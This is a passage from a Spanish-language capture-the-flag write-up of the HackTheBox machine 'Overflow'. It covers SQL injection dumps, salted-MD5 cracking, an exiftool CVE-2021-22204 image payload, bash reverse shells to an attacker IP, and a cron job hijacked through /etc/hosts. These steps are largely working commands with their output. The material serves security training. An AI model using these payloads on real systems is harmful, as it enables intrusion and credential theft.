class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=admin"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>
 &lt;div id='last'&gt;Last login : 11:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 14:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 16:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 10:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 12:00:00&lt;/div&gt;&lt;br&gt;  

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=admin'"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=admin'--+-"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=admin')--+-"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>
 &lt;div id='last'&gt;Last login : 11:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 14:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 16:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 10:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 12:00:00&lt;/div&gt;&lt;br&gt;
</code></pre></div><p>Ahora detectamos que es un SQLi de tipo <em>Union-based</em> en la tercera columna:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+('1"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+1,('2"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+1,2,('3"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>  
 &lt;div id='last'&gt;Last login : 3&lt;/div&gt;&lt;br&gt;
</code></pre></div><p>En este punto podemos extraer información de la base de datos, por ejemplo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+version()+order+by+'1"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>
 &lt;div id='last'&gt;Last login : 5.7.35-0ubuntu0.18.04.2&lt;/div&gt;&lt;br&gt;

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+user()+order+by+'1"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>
 &lt;div id='last'&gt;Last login : developer@localhost&lt;/div&gt;&lt;br&gt;

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+database()+order+by+'1"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>  
 &lt;div id='last'&gt;Last login : logs&lt;/div&gt;&lt;br&gt;
</code></pre></div><h2 id="explotación-de-sqli">Explotación de SQLi</h2><p>Para realizar la explotación más fácil, vamos a crear un <em>script</em> personalizado en Ruby llamado <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Overflow/sqli.rb"><code>sqli.rb</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Overflow#sqlirb">aquí</a>).</p><p>El <em>script</em> está diseñado para ser ejecutado por pasos. Primero, tenemos que enumerar las bases de datos existentes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --get-dbs
[*] Number of databases: 4.  

information_schema
Overflow
cmsmsdb
logs
</code></pre></div><p>Ahora, debemos enumerar las tablas en cada base de datos. Vamos a comenzar por <code>Overflow</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db Overflow --get-tables  
[*] Number of tables in Overflow: 1.

users
</code></pre></div><p>Solamente existe una tabla llamada <code>users</code>. Ahora podemos listar sus columnas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db Overflow --table users --get-columns  
[*] Number of columns in Overflow.users: 2.

username
password
</code></pre></div><p>Y finalmente, extraer los contenidos de ambas columnas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db Overflow --table users --columns username,password  
[*] Number of rows in Overflow.users: 1.

+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | c71d60439ed5590b3c5e99d95ed48165 |
+----------+----------------------------------+
</code></pre></div><p>Tenemos un <em>hash</em> de una contraseña. Por si acaso, vamos a examinar la base de datos llamada <code>logs</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db logs --get-tables
[*] Number of tables in logs: 1.

userlog

<span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db logs --table userlog --get-columns  
[*] Number of columns in logs.userlog: 3.

id
USERNAME
Lastlogin
</code></pre></div><p>Y no hay nada interesante. Finalmente, podemos analizar la base de datos llamada <code>cmsmsdb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db cmsmsdb --get-tables  
[*] Number of tables in cmsmsdb: 47.

cms_additional_users
cms_additional_users_seq
cms_admin_bookmarks
cms_admin_bookmarks_seq
cms_adminlog
cms_content
cms_content_props
cms_content_props_seq
cms_content_seq
...
cms_routes
cms_siteprefs
cms_user_groups
cms_userplugins
cms_userplugins_seq
cms_userprefs
cms_users
cms_users_seq
cms_version
</code></pre></div><p>Hay un montón de tablas. La más interesante es <code>cms_users</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db cmsmsdb --table cms_users --get-columns  
[*] Number of columns in cmsmsdb.cms_users: 10.

user_id
username
password
admin_access
first_name
last_name
email
active
create_date
modified_date
</code></pre></div><p>En esta tabla, parece que <code>username</code> y <code>password</code> serán útiles:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db cmsmsdb --table cms_users --columns user_id,username,password,admin_access  
[*] Number of rows in cmsmsdb.cms_users: 2.

+---------+----------+----------------------------------+--------------+
| user_id | username | password                         | admin_access |
+---------+----------+----------------------------------+--------------+
| 1       | admin    | c6c6b9310e0e6f3eb3ffeb2baff12fdd | 1            |
| 3       | editor   | e3d748d58b58657bfa4dffe2def0b1c7 | 1            |
+---------+----------+----------------------------------+--------------+
</code></pre></div><p>Si tratamos de romper estos <em>hashes</em> (y el que encontramos antes), no podremos. Aquí tenemos que recordar que el <em>exploit</em> de ExploitDB estaba utilizando una sal almacenada en la base de datos (específicamente, en la tabla <code>cms_siteprefs</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db cmsmsdb --table cms_siteprefs --get-columns
[*] Number of columns in cmsmsdb.cms_siteprefs: 4.

sitepref_name
sitepref_value
create_date
modified_date

<span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db cmsmsdb --table cms_siteprefs --columns sitepref_name,sitepref_value | head -7  
[*] Number of rows in cmsmsdb.cms_siteprefs: 37.

+---------------+------------------+
| sitepref_name | sitepref_value   |
+---------------+------------------+
| sitemask      | 6c2d17f37e226486 |
+---------------+------------------+
</code></pre></div><p>Y aquí tenemos la sal, ahora podemos romper los <em>hashes</em>. Para este propósito, usé un <em>script</em> sencillo en Python:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span> <span class="mtk8 mtku">hashlib</span>

<span class="mtk1">salt</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'6c2d17f37e226486'</span>
<span class="mtk1">wordlist</span> <span class="mtk5">=</span> <span class="mtk4">'rockyou.txt'</span>

<span class="mtk7 mtki">def</span> <span class="mtk8">crack</span><span class="mtk1">(</span><span class="mtk9 mtki">md5_hash</span><span class="mtk1">):</span>
    <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'[+]</span> <span class="mtk4">Cracking</span> <span class="mtk4">hash:'</span><span class="mtk1">,</span> <span class="mtk9 mtki">md5_hash</span><span class="mtk1">)</span>
    <span class="mtk5">with</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk1">wordlist</span><span class="mtk1">,</span> <span class="mtk4">'rb'</span><span class="mtk1">)</span> <span class="mtk5">as</span> <span class="mtk1">f</span><span class="mtk1">:</span>
        <span class="mtk5">for</span> <span class="mtk1">line</span> <span class="mtk5">in</span> <span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">read</span><span class="mtk1">().</span><span class="mtk8">splitlines</span><span class="mtk1">():</span>
            <span class="mtk5">if</span> <span class="mtk8 mtku">hashlib</span><span class="mtk1">.</span><span class="mtk8">md5</span><span class="mtk1">(</span><span class="mtk1">salt</span> <span class="mtk5">+</span> <span class="mtk1">line</span><span class="mtk1">).</span><span class="mtk8">hexdigest</span><span class="mtk1">()</span> <span class="mtk5">==</span> <span class="mtk9 mtki">md5_hash</span><span class="mtk1">:</span>
                <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'[*]</span> <span class="mtk4">Password</span> <span class="mtk4">hash</span> <span class="mtk4">cracked:'</span><span class="mtk1">,</span> <span class="mtk1">line</span><span class="mtk1">.</span><span class="mtk8">decode</span><span class="mtk1">())</span>  
                <span class="mtk5">break</span>

<span class="mtk8">crack</span><span class="mtk1">(</span><span class="mtk4">'c6c6b9310e0e6f3eb3ffeb2baff12fdd'</span><span class="mtk1">)</span>
<span class="mtk8">crack</span><span class="mtk1">(</span><span class="mtk4">'e3d748d58b58657bfa4dffe2def0b1c7'</span><span class="mtk1">)</span>
<span class="mtk8">crack</span><span class="mtk1">(</span><span class="mtk4">'c71d60439ed5590b3c5e99d95ed48165'</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> crack.py
[+] Cracking hash: c6c6b9310e0e6f3eb3ffeb2baff12fdd  
[+] Cracking hash: e3d748d58b58657bfa4dffe2def0b1c7
[*] Password hash cracked: alpha!@#$%bravo
[+] Cracking hash: c71d60439ed5590b3c5e99d95ed48165
</code></pre></div><p>Y tenemos la contraseña del usuario <code>editor</code>: <code>alpha!@#$%bravo</code>.</p><h2 id="intrusión-en-la-máquina">Intrusión en la máquina</h2><p>Estas credenciales son válidas para el CMS, tenemos acceso al panel de administración:</p><p><img src="/images/HTB/Overflow/Overflow-cms-admin.png" alt="Overflow CMS admin"></p><p>En el pie de página vemos que la versión del CMS es CMS Made Simple 2.2.8. Esto es útil para encontrar <em>exploits</em>. Existe un <em>exploit</em> de RCE (<a href="https://www.exploit-db.com/exploits/49345"><code>49345</code></a>) al definir una nueva etiqueta en la sección de &ldquo;<em>Extensions</em>&rdquo;. Si vamos allí, vemos este mensaje:</p><p><img src="/images/HTB/Overflow/Overflow-cms-subdomain.png" alt="Overflow CMS subdomain"></p><p>Hay otro subdominio llamado <code>devbuild-job.overflow.htb</code>.</p><p>Antes de enumerar el subdominio, podemos tratar de seguir las acciones listadas en el <em>exploit</em> para ganar ejecución remota de comandos, pero sin éxito. Por tanto, parece que no hay nada más que hacer aquí.</p><p>Si vamos a <code>http://devbuild-job.overflow.htb</code> vemos otro formulario de inicio de sesión:</p><p><img src="/images/HTB/Overflow/Overflow-devbuild-login.png" alt="Overflow DevBuild login"></p><p>El mensaje del CMS decía que entráramos con las mismas credenciales, por lo que tenemos que usar otra vez <code>editor:alpha!@#$%bravo</code>:</p><p><img src="/images/HTB/Overflow/Overflow-devbuild-index.png" alt="Overflow DevBuild index"></p><p>Parece que hay mucho por hacer, pero que no cunda el pánico. La mayoría de botones y enlaces están deshabilitados. De hecho, la página web solo tiene una funcionalidad, que es la sección &ldquo;<em>Account</em>&rdquo;:</p><p><img src="/images/HTB/Overflow/Overflow-devbuild-upload.png" alt="Overflow DevBuild upload"></p><p>Somos capaces de subir imágenes al servidor, pero de una manera peculiar. Si analizamos la respuesta con Burp Suite (Repeater), podemos ver una respuesta extraña:</p><p><img src="/images/HTB/Overflow/Overflow-burp-suite-exiftool.png" alt="Overflow Burp Suite exiftool"></p><p>La respuesta contiene la salida de ejecutar <code>exiftool</code> para extraer los metadatos de la imagen subida.</p><p>La versión de <code>exiftool</code> se muestra en el cuerpo de respuesta (11.92.) Existe una vulnerabilidad de ejecución remota de comandos (RCE) para <code>exiftool</code> por debajo de la versión 12.24 (CVE-2021-22204).</p><p>Siguiendo los pasos mostrados en este <a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">blog</a>, seremos capaces de ganar acceso a la máquina.</p><p>Para crear la imagen del <em>exploit</em>, tenemos que instalar <code>djvumake</code>. Las instrucciones están en el blog:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">vim</span> payload

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> payload
(metadata "\c${system('id')};")

<span class="code-cyan">$</span> <span class="code-dark-green">bzz</span> payload payload.bzz

<span class="code-cyan">$</span> <span class="code-dark-green">djvumake</span> exploit.jpg INFO=<span class="code-dark-yellow">'1,1'</span> BGjp=/dev/null ANTz=payload.bzz  
</code></pre></div><p>Y si subimos <code>exploit.jpg</code>, veremos la salida del comando <code>id</code> en la respuesta:</p><p><img src="/images/HTB/Overflow/Overflow-burp-suite-exiftool-exploit.png" alt="Overflow DevBuild exiftool exploit"></p><p>Una vez que tenemos RCE, podemos obtener acceso a la máquina utilizando una <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx

<span class="code-cyan">$</span> <span class="code-dark-green">vim</span> payload

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> payload
(metadata "\c${system('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash')};")  

<span class="code-cyan">$</span> <span class="code-dark-green">bzz</span> payload payload.bzz

<span class="code-cyan">$</span> <span class="code-dark-green">djvumake</span> exploit.jpg INFO=<span class="code-dark-yellow">'1,1'</span> BGjp=/dev/null ANTz=payload.bzz
</code></pre></div><p>Ahora subimos <code>exploit.jpg</code> y llega una conexión a <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.119.
Ncat: Connection from 10.10.11.119:44332.
bash: cannot set terminal process group (1019): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@overflow:~/devbuild-job/home/profile$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@overflow:~/devbuild-job/home/profile$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@overflow:~/devbuild-job/home/profile$ export TERM=xterm
www-data@overflow:~/devbuild-job/home/profile$ export SHELL=bash
www-data@overflow:~/devbuild-job/home/profile$ stty rows 50 columns 158
</code></pre></div><h2 id="movimiento-lateral-a-developer">Movimiento lateral a <code>developer</code></h2><p>Existen dos usuarios en <code>/home</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@overflow:~/devbuild-job/home/profile$ cd  
www-data@overflow:~$ pwd
/var/www
www-data@overflow:~$ ls /home
developer  tester
</code></pre></div><p>La <em>flag</em> <code>user.txt</code> está en <code>/home/tester</code>, y necesitamos ser <code>tester</code> para poder leerla. Por tanto, tenemos que realizar un movimiento lateral a <code>tester</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@overflow:~$ find / -name user.txt 2&gt;/dev/null
/home/tester/user.txt
www-data@overflow:~$ ls -l /home/tester/user.txt
-rw-r----- 1 root tester 33 Dec 31 14:28 /home/tester/user.txt  
</code></pre></div><p>Como <code>www-data</code> podemos leer el código fuente PHP. Vamos a buscar por credentiales en texto claro:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@overflow:~$ ls -la
total 16
drwxr-xr-x  4 root     root 4096 Sep 17 21:56 .
drwxr-xr-x 14 root     root 4096 Sep 17 21:56 ..
drwxr-xr-x  5 www-data root 4096 Sep 29 22:03 devbuild-job
drwxr-xr-x  6 www-data root 4096 Sep 29 02:31 html
www-data@overflow:~$ ls -la html
total 56
drwxr-xr-x 6 www-data root  4096 Sep 29 02:31 .
drwxr-xr-x 4 root     root  4096 Sep 17 21:56 ..
drwxr-xr-x 9 www-data root  4096 Sep 29 20:12 admin_cms_panel
drwxr-xr-x 5 www-data root  4096 Sep 29 02:38 assets
drwxr-xr-x 2 www-data root  4096 Sep 29 20:12 config
drwxr-xr-x 3 www-data root  4096 Sep 29 02:44 home
-rwxr-xr-x 1 www-data root 12406 Sep 29 02:24 index.php
-rwxr-xr-x 1 www-data root  2773 Sep 29 02:30 login.php
-rwxr-xr-x 1 www-data root   269 May 26  2021 logout.php
-rwxr-xr-x 1 www-data root  4251 Sep 29 02:31 register.php
www-data@overflow:~$ ls -la html/config
total 24
drwxr-xr-x 2 www-data root 4096 Sep 29 20:12 .
drwxr-xr-x 6 www-data root 4096 Sep 29 02:31 ..
-rw-r--r-- 1 root     root  418 May 25  2021 admin_last_login.js  
-rwxr-xr-x 1 www-data root  391 May 18  2021 auth.php
-rwxr-xr-x 1 www-data root  315 May 28  2021 db.php
-rwxr-xr-x 1 www-data root 3287 May 28  2021 users.php
www-data@overflow:~$ cat html/config/db.php
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>

<span class="mtk3">#define('DB_Server',</span> <span class="mtk3">'localhost');</span>
<span class="mtk3">#define('DB_Username',</span> <span class="mtk3">'root');</span>
<span class="mtk3">#define('DB_Password',</span> <span class="mtk3">'root');</span>
<span class="mtk3">#define('DB_Name',</span> <span class="mtk3">'Overflow');</span>

<span class="mtk1">$lnk</span> <span class="mtk5">=</span> <span class="mtk7">mysqli_connect</span><span class="mtk1">(</span><span class="mtk4">"localhost"</span><span class="mtk1">,</span> <span class="mtk4">"developer"</span><span class="mtk1">,</span> <span class="mtk4">"sh@tim@n"</span><span class="mtk1">,</span> <span class="mtk4">"Overflow"</span><span class="mtk1">);</span>  
<span class="mtk1">$db</span> <span class="mtk5">=</span> <span class="mtk7">mysqli_select_db</span><span class="mtk1">($lnk,</span> <span class="mtk4">"Overflow"</span><span class="mtk1">);</span>

<span class="mtk5">if</span> <span class="mtk1">($db</span> <span class="mtk5">==</span> <span class="mtk6">false</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk7">dir</span><span class="mtk1">(</span><span class="mtk4">'Cannot</span> <span class="mtk4">Connect</span> <span class="mtk4">to</span> <span class="mtk4">Database'</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk5">?&gt;</span>
</code></pre></div><p>Y aquí tenemos la contraseña del usuario <code>developer</code> de MySQL. Afortunadamente, si tranamos de cambiar de usuario a <code>developer</code> usando <code>sh@tim@n</code> como contraseña, obtendremos acceso:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@overflow:~$ su developer  
Password:
$ echo $0
sh
$ bash
developer@overflow:/var/www$
</code></pre></div><p>Nótese que hemos entrado en <code>/bin/sh</code> en lugar de <code>/bin/bash</code>.</p><h2 id="movimiento-lateral-a-tester">Movimiento lateral a <code>tester</code></h2><p>El usuario <code>developer</code> pertenece a un grupo llamado <code>network</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@overflow:/var/www$ id
uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network)  
</code></pre></div><p>Los miembros de este grupo pueden modificar <code>/etc/hosts</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@overflow:/var/www$ find / -group network 2&gt;/dev/null  
/etc/hosts
developer@overflow:/var/www$ ls -l /etc/hosts
-rwxrw-r-- 1 root network 201 Jan  1 08:20 <span class="code-green">/etc/hosts</span>
</code></pre></div><p>Con este permiso, podemos añadir subdominios al DNS local de la máquina (esto es, el archivo <code>/etc/hosts</code>).</p><p>Como necesitamos convertirnos en <code>tester</code>, vamos a ver si este usuario tiene algún archivo interesante:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@overflow:/var/www$ find / -user tester 2&gt;/dev/null | grep -v proc  
/home/tester
/home/tester/.cache
/home/tester/.ssh
/home/tester/.profile
/home/tester/.gnupg
/var/mail/tester
/opt/commontask.sh
</code></pre></div><p>Hay un <em>script</em> en Bash llamado <code>/opt/commontask.sh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@overflow:/var/www$ cat /opt/commontask.sh  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>

<span class="mtk3">#make</span> <span class="mtk3">sure</span> <span class="mtk3">its</span> <span class="mtk3">running</span> <span class="mtk3">every</span> <span class="mtk3">minute.</span>


<span class="mtk1">bash</span> <span class="mtk5">&lt;</span> <span class="mtk4">&lt;(curl</span> <span class="mtk4">-s</span> <span class="mtk4 detected-link">http://taskmanage.overflow.htb/task.sh</span><span class="mtk4">)</span>
</code></pre></div><p>Parece que contiene una tarea Cron que solicita un archivo llamado <code>task.sh</code> desde <code>http://taskmanage.overflow.htb</code> y lo ejecuta con Bash.</p><p>En este punto, tenemos que añadir un subdominio llamado <code>taskmanage.overflow.htb</code> en el <code>/etc/hosts</code> de la máquina para que apunte a nuestra dirección IP de atacante. Luego, debemos alojar un archivo llamado <code>task.sh</code> para que sea descargado y ejecutado con Bash:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@overflow:/var/www$ vim /etc/hosts
developer@overflow:/var/www$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       overflow        overflow.htb

10.10.17.44     taskmanage.overflow.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">vim</span> task.sh

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> task.sh
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>

<span class="mtk7">echo</span> <span class="mtk1">YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NC</span><span class="mtk1">AwPiYx</span> <span class="mtk5">|</span> <span class="mtk1">base64</span> <span class="mtk1">-d</span> <span class="mtk5">|</span> <span class="mtk1">bash</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.119 - - [] "GET /task.sh HTTP/1.1" 200 -  
</code></pre></div><p>Y si estamos escuchando con <code>nc</code>, onseguiremos acceso como <code>tester</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.119.
Ncat: Connection from 10.10.11.119:44534.
bash: cannot set terminal process group (7907): Inappropriate ioctl for device  
bash: no job control in this shell
tester@overflow:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tester@overflow:~$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
tester@overflow:~$ export TERM=xterm
tester@overflow:~$ export SHELL=bash
tester@overflow:~$ stty rows 50 columns 158
</code></pre></div><p>En este punto, podemos capturar la <em>flag</em> <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ cat user.txt
9248cf7d566c232e4618be372f16fe38  
</code></pre></div><h2 id="analizando-un-binario-suid">Analizando un binario SUID</h2><p>Ahora que somos <code>tester</code>, podemos mirar si hay binarios SUID inusuales:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ find / -perm -4000 2&gt;/dev/null
/usr/bin/gpasswd
/usr/bin/chsh
